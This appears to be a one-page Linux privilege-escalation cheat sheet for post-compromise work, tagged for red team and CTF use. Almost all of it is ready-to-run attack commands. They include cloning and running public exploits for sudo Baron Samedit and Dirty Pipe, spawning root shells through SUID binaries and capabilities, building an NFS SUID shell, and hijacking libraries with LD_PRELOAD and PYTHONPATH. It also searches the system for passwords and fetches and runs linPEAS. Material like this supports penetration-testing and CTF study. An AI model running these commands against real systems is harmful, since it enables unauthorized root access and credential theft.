# Linux Privilege Escalation – 1 Page Cheat Sheet

Quick reference for **post-compromise enumeration** and **common escalation paths**.

---

# 0. Quick Win Mindset

Check in this order:

1. sudo permissions
2. SUID binaries
3. capabilities
4. writable files
5. cron jobs
6. running services
7. kernel exploits
8. credentials in files/history
9. NFS shares
10. containers

---

# 1. Basic Enumeration

## System info

```bash
whoami
id
hostname
uname -a
cat /etc/os-release
```

---

## Current privileges

```bash
sudo -l
groups
```

---

## Environment

```bash
env
echo $PATH
history
```

---

## Processes

```bash
ps aux
ps aux --forest
top
```

---

## Installed packages

```bash
dpkg -l
rpm -qa
```

---

# 2. Sudo Privileges

Check allowed commands:

```bash
sudo -l
```

Run command as root:

```bash
sudo <command>
```

Run as root using UID trick (CVE-2019-14287):

```bash
sudo -u#-1 <command>
```

Check sudo version (Baron Samedit):

```bash
sudo -V
```

Exploit CVE-2021-3156:

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 1
```

---

# 3. SUID Binaries

Find SUID files:

```bash
find / -perm -4000 2>/dev/null
```

Common targets:

```text
vim
nano
find
bash
cp
perl
python
env
less
more
```

Example:

```bash
find . -exec /bin/sh \; -quit
```

---

# 4. Capabilities

List capabilities:

```bash
getcap -r / 2>/dev/null
```

Search common paths:

```bash
find /usr/bin /usr/sbin -type f -exec getcap {} \;
```

Example exploit:

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Example vulnerable binary:

```bash
/usr/bin/vim.basic /etc/passwd
```

---

# 5. Writable Files

Find writable directories:

```bash
find / -writable -type d 2>/dev/null
```

Find writable files:

```bash
find / -writable -type f 2>/dev/null
```

Check PATH hijacking:

```bash
echo $PATH
```

Writable PATH dir = privesc opportunity.

---

# 6. Cron Jobs

List cron jobs:

```bash
cat /etc/crontab
ls -la /etc/cron*
```

Look for writable scripts.

Monitor cron execution:

```bash
pspy64
```

---

# 7. Services

Check running services:

```bash
ps aux | grep root
systemctl list-units --type=service
```

Check versions:

```bash
screen -v
apache2 -v
mysql --version
```

Exploit vulnerable Screen 4.5.0:

```bash
./screen_exploit.sh
```

---

# 8. Kernel Exploits

Check kernel:

```bash
uname -r
```

Search exploit:

```bash
searchsploit <kernel version>
```

Compile exploit:

```bash
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

Common kernel vulns:

```text
Dirty COW
Dirty Pipe
Netfilter
OverlayFS
```

---

# 9. Dirty Pipe (CVE-2022-0847)

Check kernel:

```bash
uname -r
```

Download exploit:

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

Run:

```bash
./exploit-1
```

---

# 10. NFS Privilege Escalation

Check exports:

```bash
showmount -e <target>
```

Look for:

```text
no_root_squash
```

Mount share:

```bash
sudo mount -t nfs <target>:/tmp /mnt
```

Create SUID shell:

```c
setuid(0); system("/bin/bash");
```

Compile:

```bash
gcc shell.c -o shell
chmod +s shell
cp shell /mnt
```

Execute:

```bash
./shell
```

---

# 11. Shared Library Hijacking

Check library dependencies:

```bash
ldd <binary>
```

Check RUNPATH:

```bash
readelf -d <binary> | grep PATH
```

Compile malicious library:

```bash
gcc -shared -fPIC exploit.c -o libshared.so
```

Place in writable library directory.

---

# 12. LD_PRELOAD

Check sudo permissions:

```bash
sudo -l
```

If LD_PRELOAD allowed:

```bash
sudo LD_PRELOAD=/tmp/root.so <binary>
```

Compile library:

```bash
gcc -fPIC -shared root.c -o root.so
```

---

# 13. Python Library Hijacking

Check python paths:

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

Create malicious module:

```python
import os
os.system("id")
```

Run script:

```bash
sudo PYTHONPATH=/tmp python3 script.py
```

---

# 14. tmux Session Hijacking

Check tmux processes:

```bash
ps aux | grep tmux
```

Check socket:

```bash
ls -la /shareds
```

Attach:

```bash
tmux -S /shareds
```

---

# 15. Credentials in Files

Search passwords:

```bash
grep -Ri password /
grep -Ri pass /
```

Check config files:

```bash
cat config.php
cat settings.py
cat .env
```

Check bash history:

```bash
cat ~/.bash_history
```

---

# 16. Network Information

Interfaces:

```bash
ip a
ifconfig
```

Connections:

```bash
netstat -tulnp
ss -tulnp
```

---

# 17. Automated Enumeration Tools

LinPEAS:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

pspy:

```bash
./pspy64
```

Linux Exploit Suggester:

```bash
./linux-exploit-suggester.sh
```

---

# 18. Quick Workflow

```bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
uname -a
ps aux
ls -la /home
```

---

# 19. High Value Files

```text
/etc/passwd
/etc/shadow
/etc/sudoers
/root/
~/.ssh/
config files
backup files
.env files
```

---

# Tags

#linux
#privilege-escalation
#cheatsheet
#post-exploitation
#redteam
#ctf
#obsidian